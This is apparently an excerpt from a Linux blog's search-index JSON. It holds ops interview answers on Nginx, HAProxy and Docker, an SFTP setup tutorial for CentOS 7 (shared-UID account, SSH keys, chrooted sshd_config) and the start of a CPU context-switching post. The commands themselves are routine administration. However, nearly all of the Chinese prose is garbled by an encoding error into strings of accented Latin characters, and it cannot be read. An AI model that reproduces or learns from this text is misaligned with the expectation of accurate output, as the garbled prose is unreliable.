Serveråº”ç”¨çš„æœºå™¨ï¼Œå®æ–½åŠé…ç½®è¿˜æœ‰ç»´æŠ¤è¿‡ç¨‹å°±æ¯”è¾ƒéº»çƒ¦ï¼Œç›¸å¯¹è€Œè¨€ï¼ŒNginx/HAProxy+Keepalivedå°±ç®€å•å¤šäº†ã€‚ Nginxï¼š å·¥ä½œåœ¨ç¬¬7å±‚ï¼Œåº”ç”¨å±‚ï¼Œå¯ä»¥é’ˆå¯¹httpåº”ç”¨åšä¸€äº›åˆ†æµçš„ç­–ç•¥ã€‚æ¯”å¦‚é’ˆå¯¹åŸŸåã€ç›®å½•ç»“æ„ã€‚å®ƒçš„æ­£åˆ™æ¯”HAProxyæ›´ä¸ºå¼ºå¤§å’Œçµæ´»ï¼› Nginxå¯¹ç½‘ç»œçš„ä¾èµ–éå¸¸å°ï¼Œç†è®ºä¸Šèƒ½pingé€šå°±å°±èƒ½è¿›è¡Œè´Ÿè½½åŠŸèƒ½ Nginxå®‰è£…å’Œé…ç½®ç®€å• å¯ä»¥æ‰¿æ‹…é«˜çš„è´Ÿè½½å‹åŠ›ä¸”ç¨³å®šï¼Œä¸€èˆ¬èƒ½æ”¯æ’‘è¶…è¿‡å‡ ä¸‡æ¬¡çš„å¹¶å‘é‡ï¼› Nginxä¸ä»…ä»…æ˜¯ä¸€æ¬¾ä¼˜ç§€çš„è´Ÿè½½å‡è¡¡å™¨/åå‘ä»£ç†è½¯ä»¶ï¼Œå®ƒåŒæ—¶ä¹Ÿæ˜¯åŠŸèƒ½å¼ºå¤§çš„Webåº”ç”¨æœåŠ¡å™¨ã€‚Nginxåœ¨å¤„ç†é™æ€é¡µé¢ã€ç‰¹åˆ«æ˜¯æŠ—é«˜å¹¶å‘æ–¹é¢ç›¸å¯¹apacheæœ‰ä¼˜åŠ¿ï¼› Nginxä½œä¸ºWebåå‘ä»£ç†åŠ é€Ÿç¼“å­˜è¶Šæ¥è¶Šæˆç†Ÿï¼Œé€Ÿåº¦æ¯”ä¼ ç»Ÿçš„SquidæœåŠ¡å™¨æ›´å¿« Nginxçš„ç¼ºç‚¹ï¼š Nginxä¸æ”¯æŒurlæ¥æ£€æµ‹ã€‚ Nginxä»…èƒ½æ”¯æŒhttpã€httpså’ŒEmailåè®® Nginxçš„Sessionçš„ä¿æŒï¼ŒCookieçš„å¼•å¯¼èƒ½åŠ›ç›¸å¯¹æ¬ ç¼ºã€‚ HAProxyï¼š HAProxyæ˜¯æ”¯æŒè™šæ‹Ÿä¸»æœºçš„ï¼Œå¯ä»¥å·¥ä½œåœ¨4ã€7å±‚(æ”¯æŒå¤šç½‘æ®µ)ï¼› èƒ½å¤Ÿè¡¥å……Nginxçš„ä¸€äº›ç¼ºç‚¹æ¯”å¦‚Sessionçš„ä¿æŒï¼ŒCookieçš„å¼•å¯¼ç­‰å·¥ä½œï¼› æ”¯æŒurlæ£€æµ‹åç«¯çš„æœåŠ¡å™¨ï¼› å®ƒè·ŸLVSä¸€æ ·ï¼Œæœ¬èº«ä»…ä»…å°±åªæ˜¯ä¸€æ¬¾è´Ÿè½½å‡è¡¡è½¯ä»¶ï¼›å•çº¯ä»æ•ˆç‡ä¸Šæ¥è®²HAProxyæ›´ä¼šæ¯”Nginxæœ‰æ›´å‡ºè‰²çš„è´Ÿè½½å‡è¡¡é€Ÿåº¦ï¼Œåœ¨å¹¶å‘å¤„ç†ä¸Šä¹Ÿæ˜¯ä¼˜äºNginxçš„ï¼› HAProxyå¯ä»¥å¯¹Mysqlè¯»è¿›è¡Œè´Ÿè½½å‡è¡¡ï¼Œå¯¹åç«¯çš„MySQLèŠ‚ç‚¹è¿›è¡Œæ£€æµ‹å’Œè´Ÿè½½å‡è¡¡ï¼Œä¸è¿‡åœ¨åç«¯çš„MySQL slavesæ•°é‡è¶…è¿‡10å°æ—¶æ€§èƒ½ä¸å¦‚LVSï¼› HAProxyçš„ç®—æ³•è¾ƒå¤šï¼Œè¾¾åˆ°8ç§ï¼› å·¥ä½œé€‰æ‹©ï¼š HAproxyå’ŒNginxç”±äºå¯ä»¥åšä¸ƒå±‚çš„è½¬å‘ï¼Œæ‰€ä»¥URLå’Œç›®å½•çš„è½¬å‘éƒ½å¯ä»¥åšåœ¨å¾ˆå¤§å¹¶å‘é‡çš„æ—¶å€™æˆ‘ä»¬å°±è¦é€‰æ‹©LVSï¼Œåƒä¸­å°å‹å…¬å¸çš„è¯å¹¶å‘é‡æ²¡é‚£ä¹ˆå¤§é€‰æ‹©HAproxyæˆ–è€…Nginxè¶³å·²ï¼Œç”±äºHAproxyç”±æ˜¯ä¸“ä¸šçš„ä»£ç†æœåŠ¡å™¨é…ç½®ç®€å•ï¼Œæ‰€ä»¥ä¸­å°å‹ä¼ä¸šæ¨èä½¿ç”¨HAproxyã€‚ 7. dockerçš„å·¥ä½œåŸç†æ˜¯ä»€ä¹ˆï¼Œè®²ä¸€ä¸‹ dockeræ˜¯ä¸€ä¸ªClient-Serverç»“æ„çš„ç³»ç»Ÿï¼Œdockerå®ˆæŠ¤è¿›ç¨‹è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šï¼Œå®ˆæŠ¤è¿›ç¨‹ä»å®¢æˆ·ç«¯æ¥å—å‘½ä»¤å¹¶ç®¡ç†è¿è¡Œåœ¨ä¸»æœºä¸Šçš„å®¹å™¨ï¼Œå®¹å™¨æ˜¯ä¸€ä¸ªè¿è¡Œæ—¶ç¯å¢ƒï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¯´çš„é›†è£…ç®±ã€‚ 8. dockerçš„ç»„æˆåŒ…å«å“ªå‡ å¤§éƒ¨åˆ† ä¸€ä¸ªå®Œæ•´çš„dockeræœ‰ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ç»„æˆï¼š docker clientï¼šå®¢æˆ·ç«¯ï¼Œä¸ºç”¨æˆ·æä¾›ä¸€ç³»åˆ—å¯æ‰§è¡Œå‘½ä»¤ï¼Œç”¨æˆ·ç”¨è¿™äº›å‘½ä»¤å®ç°è·Ÿ docker daemon äº¤äº’ï¼› docker daemonï¼šå®ˆæŠ¤è¿›ç¨‹ï¼Œä¸€èˆ¬åœ¨å®¿ä¸»ä¸»æœºåå°è¿è¡Œï¼Œç­‰å¾…æ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚æ¶ˆæ¯ï¼› docker imageï¼šé•œåƒï¼Œé•œåƒrunä¹‹åå°±ç”Ÿæˆä¸ºdockerå®¹å™¨ï¼› docker containerï¼šå®¹å™¨ï¼Œä¸€ä¸ªç³»ç»Ÿçº§åˆ«çš„æœåŠ¡ï¼Œæ‹¥æœ‰è‡ªå·±çš„ipå’Œç³»ç»Ÿç›®å½•ç»“æ„ï¼›è¿è¡Œå®¹å™¨å‰éœ€è¦æœ¬åœ°å­˜åœ¨å¯¹åº”çš„é•œåƒï¼Œå¦‚æœæœ¬åœ°ä¸å­˜åœ¨è¯¥é•œåƒåˆ™å°±å»é•œåƒä»“åº“ä¸‹è½½ã€‚ dockerï¼š ä½¿ç”¨å®¢æˆ·ç«¯-æœåŠ¡å™¨ (C/S) æ¶æ„æ¨¡å¼ï¼Œä½¿ç”¨è¿œç¨‹apiæ¥ç®¡ç†å’Œåˆ›å»ºdockerå®¹å™¨ã€‚docker å®¹å™¨é€šè¿‡ docker é•œåƒæ¥åˆ›å»ºã€‚å®¹å™¨ä¸é•œåƒçš„å…³ç³»ç±»ä¼¼äºé¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­çš„å¯¹è±¡ä¸ç±»ã€‚ 9. dockerä¸ä¼ ç»Ÿè™šæ‹Ÿæœºçš„åŒºåˆ«ä»€ä¹ˆï¼Ÿ ä¼ ç»Ÿè™šæ‹Ÿæœºæ˜¯éœ€è¦å®‰è£…æ•´ä¸ªæ“ä½œç³»ç»Ÿçš„ï¼Œç„¶åå†åœ¨ä¸Šé¢å®‰è£…ä¸šåŠ¡åº”ç”¨ï¼Œå¯åŠ¨åº”ç”¨ï¼Œé€šå¸¸éœ€è¦å‡ åˆ†é’Ÿå»å¯åŠ¨åº”ç”¨ï¼Œè€Œdockeræ˜¯ç›´æ¥ä½¿ç”¨é•œåƒæ¥è¿è¡Œä¸šåŠ¡å®¹å™¨çš„ï¼Œå…¶å®¹å™¨å¯åŠ¨å±äºç§’çº§åˆ«ï¼› Dockeréœ€è¦çš„èµ„æºæ›´å°‘ï¼ŒDockeråœ¨æ“ä½œç³»ç»Ÿçº§åˆ«è¿›è¡Œè™šæ‹ŸåŒ–ï¼ŒDockerå®¹å™¨å’Œå†…æ ¸äº¤äº’ï¼Œå‡ ä¹æ²¡æœ‰æ€§èƒ½æŸè€—ï¼Œè€Œè™šæ‹Ÿæœºè¿è¡Œç€æ•´ä¸ªæ“ä½œç³»ç»Ÿï¼Œå ç”¨ç‰©ç†æœºçš„èµ„æºå°±æ¯”è¾ƒå¤š; Dockeræ›´è½»é‡ï¼ŒDockerçš„æ¶æ„å¯ä»¥å…±ç”¨ä¸€ä¸ªå†…æ ¸ä¸å…±äº«åº”ç”¨ç¨‹åºåº“ï¼Œæ‰€å å†…å­˜æå°;åŒæ ·çš„ç¡¬ä»¶ç¯å¢ƒï¼ŒDockerè¿è¡Œçš„é•œåƒæ•°è¿œå¤šäºè™šæ‹Ÿæœºæ•°é‡ï¼Œå¯¹ç³»ç»Ÿçš„åˆ©ç”¨ç‡éå¸¸é«˜; ä¸è™šæ‹Ÿæœºç›¸æ¯”ï¼ŒDockeréš”ç¦»æ€§æ›´å¼±ï¼ŒDockerå±äºè¿›ç¨‹ä¹‹é—´çš„éš”ç¦»ï¼Œè™šæ‹Ÿæœºå¯å®ç°ç³»ç»Ÿçº§åˆ«éš”ç¦»; Dockerçš„å®‰å…¨æ€§ä¹Ÿæ›´å¼±ï¼ŒDockerçš„ç§Ÿæˆ·rootå’Œå®¿ä¸»æœºrootç›¸åŒï¼Œä¸€æ—¦å®¹å™¨å†…çš„ç”¨æˆ·ä»æ™®é€šç”¨æˆ·æƒé™æå‡ä¸ºrootæƒé™ï¼Œå®ƒå°±ç›´æ¥å…·å¤‡äº†å®¿ä¸»æœºçš„rootæƒé™ï¼Œè¿›è€Œå¯è¿›è¡Œæ— é™åˆ¶çš„æ“ä½œã€‚è™šæ‹Ÿæœºç§Ÿæˆ·rootæƒé™å’Œå®¿ä¸»æœºçš„rootè™šæ‹Ÿæœºæƒé™æ˜¯åˆ†ç¦»çš„ï¼Œå¹¶ä¸”è™šæ‹Ÿæœºåˆ©ç”¨å¦‚Intelçš„VT-då’ŒVT-xçš„ring-1ç¡¬ä»¶éš”ç¦»æŠ€æœ¯ï¼Œè¿™ç§æŠ€æœ¯å¯ä»¥é˜²æ­¢è™šæ‹Ÿæœºçªç ´å’Œå½¼æ­¤äº¤äº’ï¼Œè€Œå®¹å™¨è‡³ä»Šè¿˜æ²¡æœ‰ä»»ä½•å½¢å¼çš„ç¡¬ä»¶éš”ç¦»; Dockerçš„é›†ä¸­åŒ–ç®¡ç†å·¥å…·è¿˜ä¸ç®—æˆç†Ÿï¼Œå„ç§è™šæ‹ŸåŒ–æŠ€æœ¯éƒ½æœ‰æˆç†Ÿçš„ç®¡ç†å·¥å…·ï¼Œæ¯”å¦‚ï¼šVMware vCenteræä¾›å®Œå¤‡çš„è™šæ‹Ÿæœºç®¡ç†èƒ½åŠ›; Dockerå¯¹ä¸šåŠ¡çš„é«˜å¯ç”¨æ”¯æŒæ˜¯é€šè¿‡å¿«é€Ÿé‡æ–°éƒ¨ç½²å®ç°çš„ï¼Œè™šæ‹ŸåŒ–å…·å¤‡è´Ÿè½½å‡è¡¡ï¼Œé«˜å¯ç”¨ã€å®¹é”™ã€è¿ç§»å’Œæ•°æ®ä¿æŠ¤ç­‰ç»è¿‡ç”Ÿäº§å®è·µæ£€éªŒçš„æˆç†Ÿä¿éšœæœºåˆ¶ï¼ŒVmwareå¯æ‰¿è¯ºè™šæ‹Ÿæœº99.999%é«˜å¯ç”¨ï¼Œä¿è¯ä¸šåŠ¡è¿ç»­æ€§; è™šæ‹ŸåŒ–åˆ›å»ºæ˜¯åˆ†é’Ÿçº§åˆ«çš„ï¼ŒDockerå®¹å™¨åˆ›å»ºæ˜¯ç§’çº§åˆ«çš„ï¼ŒDockerçš„å¿«é€Ÿè¿­ä»£æ€§ï¼Œå†³å®šäº†æ— è®ºæ˜¯å¼€å‘ã€æµ‹è¯•ã€éƒ¨ç½²éƒ½å¯ä»¥èŠ‚çœå¤§é‡æ—¶é—´; è™šæ‹Ÿæœºå¯ä»¥é€šè¿‡é•œåƒå®ç°ç¯å¢ƒäº¤ä»˜çš„ä¸€è‡´æ€§ï¼Œä½†é•œåƒåˆ†å‘æ— æ³•ä½“ç³»åŒ–ï¼ŒDockeråœ¨Dockerfileä¸­è®°å½•äº†å®¹å™¨æ„å»ºè¿‡ç¨‹ï¼Œå¯åœ¨é›†ç¾¤ä¸­å®ç°å¿«é€Ÿåˆ†å‘å’Œå¿«é€Ÿéƒ¨ç½²ã€‚from wljslmz 10. dockeræŠ€æœ¯çš„ä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µæ˜¯ä»€ä¹ˆï¼Ÿ é•œåƒï¼šé•œåƒæ˜¯ä¸€ç§è½»é‡çº§ã€å¯æ‰§è¡Œçš„ç‹¬ç«‹è½¯ä»¶åŒ…ï¼Œå®ƒåŒ…å«è¿è¡ŒæŸä¸ªè½¯ä»¶æ‰€éœ€çš„æ‰€æœ‰å†…å®¹ï¼Œæˆ‘ä»¬æŠŠåº”ç”¨ç¨‹åºå’Œé…ç½®ä¾èµ–æ‰“åŒ…å¥½å½¢æˆä¸€ä¸ªå¯äº¤ä»˜çš„è¿è¡Œç¯å¢ƒ(åŒ…æ‹¬ä»£ç ã€è¿è¡Œæ—¶éœ€è¦çš„åº“ã€ç¯å¢ƒå˜é‡å’Œé…ç½®æ–‡ä»¶ç­‰)ï¼Œè¿™ä¸ªæ‰“åŒ…å¥½çš„è¿è¡Œç¯å¢ƒå°±æ˜¯imageé•œåƒæ–‡ä»¶ã€‚ å®¹å™¨ï¼šå®¹å™¨æ˜¯åŸºäºé•œåƒåˆ›å»ºçš„ï¼Œæ˜¯é•œåƒè¿è¡Œèµ·æ¥ä¹‹åçš„ä¸€ä¸ªå®ä¾‹ï¼Œå®¹å™¨æ‰æ˜¯çœŸæ­£è¿è¡Œä¸šåŠ¡ç¨‹åºçš„åœ°æ–¹ã€‚å¦‚æœæŠŠé•œåƒæ¯”ä½œç¨‹åºé‡Œé¢çš„ç±»ï¼Œé‚£ä¹ˆå®¹å™¨å°±æ˜¯å¯¹è±¡ã€‚ é•œåƒä»“åº“ï¼šå­˜æ”¾é•œåƒçš„åœ°æ–¹ï¼Œç ”å‘å·¥ç¨‹å¸ˆæ‰“åŒ…å¥½é•œåƒä¹‹åéœ€è¦æŠŠé•œåƒä¸Šä¼ åˆ°é•œåƒä»“åº“ä¸­å»ï¼Œç„¶åå°±å¯ä»¥è¿è¡Œæœ‰ä»“åº“æƒé™çš„äººæ‹‰å–é•œåƒæ¥è¿è¡Œå®¹å™¨äº†ã€‚ 11. centosé•œåƒå‡ ä¸ªGï¼Œä½†æ˜¯docker centosé•œåƒæ‰å‡ ç™¾å…†ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ ä¸€ä¸ªå®Œæ•´çš„Linuxæ“ä½œç³»ç»ŸåŒ…å«Linuxå†…æ ¸å’Œrootfsæ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œå³æˆ‘ä»¬ç†Ÿæ‚‰çš„/devã€/","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"è¿ç»´å¸¸è§é¢è¯•é¢˜","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"SFTPæ­å»º","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/","tags":["linux","è§£å†³æ–¹æ¡ˆ","sftp"],"title":"SFTPæ­å»º","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":" æ³¨æ„ æœ¬æ–‡å†…å®¹ä»…åœ¨CentOS 7ä¸Šè¿›è¡Œæµ‹è¯• å‰è¨€ æ–‡ç« ä»‹ç»å¦‚ä½•è®©sftpä¹Ÿå¯ä»¥å®ç°vsftpdè™šæ‹Ÿç”¨æˆ·çš„åŠŸèƒ½ã€‚ å¯¹äºè¿ç»´æ¥è¯´ï¼Œæˆ‘ä»¬ä½¿ç”¨æ–‡ä»¶ä¼ è¾“åŠŸèƒ½çš„æ—¶å€™éƒ½æ˜¯ä¼˜å…ˆä½¿ç”¨vsftpdï¼Œè€Œä¸æ˜¯sftp,å¤šæ•°åŸå› æˆ‘æƒ³åº”è¯¥éƒ½æ˜¯å› ä¸ºvsftpdå…·æœ‰è™šæ‹Ÿç”¨æˆ·çš„åŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½åœ¨é’ˆå¯¹ç‰¹å®šçš„æœåŠ¡æ¥è¯´æ˜¯éå¸¸å‹å¥½çš„ã€‚æ¯”å¦‚phpæœåŠ¡é™æƒå¯åŠ¨æ—¶ï¼Œè¢«è¯»å–æ–‡ä»¶çš„æ–‡ä»¶æƒé™é—®é¢˜ã€‚ ä¸Šè¿°çš„é—®é¢˜ï¼Œsftpå®é™…ä¸Šä¹Ÿæ˜¯å¯ä»¥è§£å†³ï¼Œå€ŸåŠ©useradd -oé€‰é¡¹å®ç°ã€‚ [cxd@0x5c0f ~][0]$ useradd --help ç”¨æ³•ï¼šuseradd [é€‰é¡¹] ç™»å½•å useradd -D useradd -D [é€‰é¡¹] é€‰é¡¹ï¼š -h, --help æ˜¾ç¤ºæ­¤å¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º -k, --skel SKEL_DIR ä½¿ç”¨æ­¤ç›®å½•ä½œä¸ºéª¨æ¶ç›®å½• The skeleton directory, which contains files and directories to be copied in the user\\'s home directory, when the home directory is created by useradd. This option is only valid if the -m (or --create-home) option is specified. If this option is not set, the skeleton directory is defined by the SKEL variable in /etc/default/useradd or, by default, /etc/skel. -m, --create-home åˆ›å»ºç”¨æˆ·çš„ä¸»ç›®å½• -o, --non-unique å…è®¸ä½¿ç”¨é‡å¤çš„ UID åˆ›å»ºç”¨æˆ· This option is only valid in combination with the -u option. -s, --shell SHELL æ–°è´¦æˆ·çš„ç™»å½• shell -u, --uid UID æ–°è´¦æˆ·çš„ç”¨æˆ· ID æ­£æ–‡ ä»¥ä¸‹å®šä¹‰WEBServerçš„åŸºç¡€ç”¨æˆ·ä¸ºwww,ä»¥phpä¸ºä¾‹,php-fpmå¯åŠ¨è¿›ç¨‹æ‰€å±åˆ™ä¸ºwwwç”¨æˆ·ï¼Œé‚£ä¹ˆä¹Ÿåªèƒ½è¯»å–wwwç”¨æˆ·æ‰€æ‹¥æœ‰æ“ä½œæƒé™çš„æ–‡ä»¶ã€‚ ç”¨æˆ·åˆ›å»º åˆ›å»ºsftpç™»é™†ç”¨æˆ·ï¼Œä½¿ç”¨-oé€‰é¡¹ï¼Œè®©å½“å‰ç”¨æˆ·ä¿æŒä¸wwwåŒå±ä¸»UIDã€åŒå±ç»„GID $\u003e groupadd -o -g $(id -g www) webapp $\u003e useradd -o -u $(id -u www) -g webapp -m -k $(mktemp -d) -s /bin/false webapp # æ­¤å¸å·åªæ˜¯sftpä½¿ç”¨ï¼Œæ‰€æœ‰åˆ›å»ºæ—¶å€™æ·»åŠ -ké€‰é¡¹ï¼Œä¸è®©useraddå¤åˆ¶/etc/skelä¸‹å†…å®¹ å¸å·åˆ›å»ºæˆåŠŸåï¼Œå¯åœ¨/etc/passwdä¸­çœ‹åˆ°è¯¥å¸å·ï¼Œæ­¤æ—¶åº”å¯ä»¥çœ‹åˆ°ä»–çš„æ‰€å±ä¸»å’Œå±ç»„å’Œwwwå¸å·ä¸€è‡´ åˆ›å»ºsftpç™»é™†å¯†é’¥ # ç”±äºssh-keygenåœ¨åˆ›å»ºé»˜è®¤å¯†é’¥æ—¶æ— æ³•æ›´æ–°æ­¤è·¯å¾„ï¼Œå› æ­¤éœ€è¦ä¸»åŠ¨åˆ›å»ºè¯¥ç›®å½• $\u003e mkdir /home/webapp/.ssh # æ­¤å¤„æˆæƒå¯ä»¥ç›´æ¥æˆæƒwww:wwwï¼Œä¸ºäº†çœ‹èµ·æ¥æ›´æ¸…æ™°ï¼Œæ­¤å¤„æˆæƒè¿˜æ˜¯ç”¨åˆ›å»ºæ—¶çš„ç”¨æˆ·ï¼Œä½†æ— è®ºä½¿ç”¨çš„æ˜¯é‚£ä¸€ä¸ªï¼Œç³»ç»Ÿæ˜¾ç¤ºéƒ½ä¼šæ˜¯www $\u003e chown webapp:webapp /home/webapp/.ssh # å¯†é’¥åˆ›å»º $\u003e su - webapp -s /bin/bash -c \"ssh-keygen -f ~/.ssh/id_rsa -t rsa -b 4096 -N ''\" $\u003e su - webapp -s /bin/bash -c \"cat ~/.ssh/id_rsa.pub \u003e ~/.ssh/authorized_keys \u0026\u0026 chmod 600 ~/.ssh/authorized_keys\" ä¿®æ”¹/etc/ssh/sshd_config # æ³¨æ„æ­¤é¡¹, ç½‘ä¸Šçš„sftpæ­å»ºæ•™ç¨‹åŸºæœ¬éƒ½æ˜¯è¯´éœ€è¦å°†æ­¤é¡¹åˆ‡æ¢ä¸º, Subsystem sftp internal-sftp # åˆ‡æ¢åå°†ç»•è¿‡\"ç®¡ç†å‘˜å¯èƒ½ä¾èµ–ç™»å½•shellé…ç½®æ¥é˜»æ­¢æŸäº›ç”¨æˆ·ç™»å½•\"ã€‚ä½†æˆ‘ä»¬ä¸Šè¿°ä½¿ç”¨çš„æ˜¯é‡å¤UIDï¼Œæ‰€ä»¥æ­¤å¤„ä¸èƒ½æ›´æ”¹ # è‹¥æ›´æ”¹ï¼Œåˆ™ä¼šå¯¼è‡´å…±ç”¨UIDçš„ç”¨æˆ·ä¹‹é—´å¯ç›¸äº’ç™»é™†ã€‚ # å·®å¼‚å‚è§: https://serverfault.com/questions/660160/openssh-difference-between-internal-sftp-and-sftp-server # å·®å¼‚å‚è§: http://129.226.226.195/post/21921.html Subsystem sftp /usr/libexec/openssh/sftp-server # æŒ‡å®šåŒ¹é…ç”¨æˆ· Match User webapp # ç”¨chrootå°†ç”¨æˆ·çš„æ ¹ç›®å½•æŒ‡å‘åˆ°å›ºå®šä½ç½® ChrootDirectory /sftpdir # -l æŒ‡å®šæ—¥å¿—æ”¶é›† -f æ”¶é›†å†…å®¹(åº”è¯¥æ˜¯) internal-sftp è¯·å‚çœ‹ä¸Šè¿°è¿æ¥è‡ªè¡Œå‚æ‚Ÿ ForceCommand internal-sftp -l INFO -f AUTH # ä»¥ä¸‹å…¶ä»–é…ç½®è‡ªè¡Œå‚æ‚Ÿ PermitTTY no X11Forwarding no AllowTcpForwarding no PasswordAuthentication no å¼€å§‹æµ‹è¯• # ä¸Šè¿°æ“ä½œå®Œæˆåï¼Œè¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªchrootç›®å½• $\u003e mkdir /sftpdir $\u003e echo hello \u003e /sftpdir/readme.md # æ³¨æ„ç›®å½•å±ä¸»å¿…é¡»ä¸ºroot,å±ç»„å¯ä»¥ä¸æ˜¯ï¼Œæƒé™ä¸èƒ½è¶…è¿‡755 $\u003e chown root.root /sftpdir $\u003e chmod 755 /sftpdir # é‡å¯sshdæœåŠ¡(é‡è½½ä¹Ÿå¯ä»¥) $\u003e systemctl reload sshd ## ç™»é™†æµ‹è¯• $\u003e sftp -i /home/webapp/.ssh/id_rsa webapp@127.0.0.1 The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:hQkISJWcE+gHf1WAT2bIWSwiAJRD81Bv3wZd+1vZOuU. ECDSA key fingerprint is MD5:0e:e5:1a:c7:6c:97:fb:48:95:d2:c9:86:bb:d0:7d:91. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts. Connected to 127.0.0.1. sftp\u003e ls -l -rw-r--r-- 1 0 0 6 Dec 8 06:31 readme.md sftp\u003e pwd Remote working directory: / sftp\u003e åç»­ è‡³æ­¤ï¼Œsftpæ­å»ºå®Œæˆ, å½“ç„¶ç”±äº /ç›®å½•å±ä¸»ä¸ºroot,sftpç›®å‰åªèƒ½ç™»é™†ï¼Œæ— æ³•ä¸Šä¼ ï¼Œéœ€è¦åœ¨/sftpdirç›®å½•ä¸‹åˆ›å»ºç›®å½•ï¼Œç„¶åæˆæƒwwwç”¨æˆ·å³å¯ï¼Œåœ¨è¯¥ç›®å½•ä¸‹è¿›è¡Œå¢ã€åˆ ã€æ”¹æ“ä½œã€‚ å…¶ä»–é—®é¢˜ ä¸ºä»€ä¹ˆä½¿ç”¨sftp: sftpä½¿ç”¨åŠ å¯†ä¼ è¾“è®¤è¯ä¿¡æ¯å’Œä¼ è¾“çš„æ•°æ®ï¼Œç›¸å¯¹ftpè€Œè¨€æ›´ä¸ºå®‰å…¨ä¸€ç‚¹. ç›®å½•æ˜ å°„: è™šæ‹Ÿç”¨æˆ·å®ç°äº†ï¼Œé‚£è¯¥å¦‚ä½•å®ç°ç›®å½•æ˜ å°„å‘¢ï¼Œè½¯è¿æ¥è¿˜æ˜¯æ¯ä¸ªç›®å½•å•ç‹¬å»ºä¸€ä¸ªç”¨æˆ·ï¼Ÿå…¶å®éƒ½ä¸æ˜¯ï¼Œæˆ‘ä»¬åªéœ€è¦å€ŸåŠ©mountå‘½ä»¤çš„bindå±æ€§å³å¯ï¼Œå…·ä½“ä½¿ç”¨æ–¹å¼è¯·è‡ªè¡Œå‚æ‚Ÿ(http://blog.0x5c0f.cc/2019/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/#mount---bind) å¸å·ç®¡ç†: å…±UIDå¸å·(webapp)ç›´æ¥åˆ é™¤æ—¶å€™åŸºæœ¬éƒ½ä¼šæœ‰æç¤ºï¼Œå¦‚æœä¸»å¸å·wwwæ­£åœ¨ä½¿ç”¨(å¦‚phpã€nginx)ï¼Œé‚£ä¹ˆåˆ é™¤çš„æ—¶å€™å°±ä¼šæç¤ºæ— æ³•åˆ é™¤ï¼Œæ­¤æ—¶æˆ‘ä»¬åªéœ€è¦å¼ºåˆ¶åˆ é™¤å³å¯(userdelçš„-fé€‰é¡¹)ï¼Œå¹¶ä¸ä¼šå½±å“ä¸»å¸å·å’Œå…¶ä»–å¸å·(æ³¨:è¿™ä¸ªæˆ‘åªåœ¨CentOS 7ä¸Šè¿›è¡Œè¿‡æµ‹è¯•ï¼Œç†è®ºä¸Šæ‰€æœ‰å‘è¡Œç‰ˆæ˜¯ä¸€è‡´çš„) æ—¥å¿—æŸ¥çœ‹: tail -f /var/log/secure ","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ","sftp"],"title":"SFTPæ­å»º","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"Linuxæ€§èƒ½æŒ‡æ ‡ä¹‹cpuä¸Šä¸‹æ–‡åˆ‡æ¢","date":"2022-09-01","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"Linuxæ€§èƒ½æŒ‡æ ‡ä¹‹cpuä¸Šä¸‹æ–‡åˆ‡æ¢","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" é€è¿‡ç°è±¡çœ‹æœ¬è´¨ CPUä¸Šä¸‹æ–‡åˆ‡æ¢ https://blog.csdn.net/qq_34556414/article/details/107094209 CPUä¸Šä¸‹æ–‡åˆ‡æ¢æ˜¯ä¿è¯Linuxç³»ç»Ÿæ­£å¸¸å·¥ä½œçš„ä¸€ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼ŒæŒ‰ç…§ä¸åŒåœºæ™¯ï¼Œå¯ä»¥åˆ†ä¸ºè¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ã€çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œä¸­æ–­ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚ç©¶ç«Ÿæ€ä¹ˆåˆ†æCPUä¸Šä¸‹æ–‡åˆ‡æ¢çš„é—®é¢˜ã€‚ è¿‡å¤šçš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œä¼šæŠŠCPUæ—¶é—´æ¶ˆè€—åœ¨å¯„å­˜å™¨ã€å†…æ ¸æ 